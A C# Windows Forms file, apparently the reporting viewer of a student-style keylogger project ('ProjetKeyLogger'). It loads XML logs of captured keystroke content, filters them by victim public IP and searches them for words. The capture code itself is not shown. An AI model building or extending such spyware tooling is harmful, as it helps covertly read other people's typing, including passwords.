using System;
using System.Collections.Generic;
using System.Windows.Forms;
using ProjetKeyLogger;

namespace ProjetEspionReporting
{
    public partial class Form1 : Form
    {
        CollectionEnregistrement collection_enregistrement = new CollectionEnregistrement();

        public Form1()
        {
            InitializeComponent();
        }

        private void ouvrirToolStripMenuItem_Click(object sender, EventArgs e)
        {

            //Chargement du fichier XML
            if (this.openFileDialog_ouvrir.ShowDialog() == DialogResult.OK)
            {

                //Instanciation de la collection
                collection_enregistrement = new CollectionEnregistrement();

                // pour chaque documents
                foreach (String file in openFileDialog_ouvrir.FileNames)
                {
                    //Pour chaque enregistrement
                    foreach (Enregistrement enregistrement in CollectionEnregistrement.loadFromXML(file).List_Enregistrement)
                    {
                        //On ajoute l'enregistrement 
                        collection_enregistrement.ajouter(enregistrement);

                        //On affiche la date dans la liste d'enregistrement
                        this.listBox_enregistrements.Items.Add(enregistrement.Date);

                    }

                }

                //On met a jour le comboBox des adresses
                this.initComboBoxAdresse();

            }

        }

        private void listBox_enregistrements_SelectedIndexChanged(object sender, EventArgs e)
        {
            foreach (Enregistrement enregistrement in collection_enregistrement.List_Enregistrement)
            {
                //si la date et l'heure correspondent a l'enregistrement selectionné dans la liste
                //et
                //si l'adresse correspond au combobox de filtre sur les adresse ou si il n'y a pas de filtres
                if (enregistrement.Date.Contains(this.listBox_enregistrements.SelectedItem.ToString()) && enregistrement.Adresse_Ip_Publique.Contains(comboBox_adresse.SelectedIndex.ToString()))
                {
                    //on affiche le contenu de l'enregistrement dans le label
                    label_contenu.Text = enregistrement.Contenu;
                    break;
                 }
            }
            
        }

        //Recherche du mot saisie dans le textbox 
        private void button_recherche_Click(object sender, EventArgs e)
        {
            //on vide la listBox
            listBox_enregistrements.Items.Clear();

            //Pour chaque enregistrement
            for (int i = 0; i < collection_enregistrement.List_Enregistrement.Count; i++)
            {
                //Si la chaine contient le mot
                if (collection_enregistrement.List_Enregistrement[i].Contenu.Contains(textBox_recherche.Text.ToString()))
                {
                    //Alors on ajoute l'enregistrement a la liste
                    listBox_enregistrements.Items.Add(collection_enregistrement.List_Enregistrement[i].Date);
                }
            }
        }

        private void initComboBoxAdresse()
        {
            //pour chaque enregistrements de la collection
            foreach (Enregistrement enregistrement in collection_enregistrement.List_Enregistrement)
            {
                //Si l'adresse n'existe pas dans la liste
                if(comboBox_adresse.Items.Contains(enregistrement.Adresse_Ip_Publique) == false){
                    //Alors on ajoute un item au comboBox
                    comboBox_adresse.Items.Add(enregistrement.Adresse_Ip_Publique);
                }

            }
            //Item par défaut
            comboBox_adresse.SelectedItem = comboBox_adresse.Items[0].ToString();
        }

        private void comboBox_adresse_SelectedIndexChanged(object sender, EventArgs e)
        {
            //on vide la listBox
            listBox_enregistrements.Items.Clear();

            //Pour chaque element de la colection
            for (int i = 0; i < collection_enregistrement.List_Enregistrement.Count; i++)
            {
                //Si l'enregistrement vient de l'adresse selectioné
                if (collection_enregistrement.List_Enregistrement[i].Adresse_Ip_Publique.Contains(comboBox_adresse.SelectedItem.ToString()))
                {
                    //Alors on ajoute l'enregistrement a la liste
                    listBox_enregistrements.Items.Add(collection_enregistrement.List_Enregistrement[i].Date);
                }
            }
        }
    }
}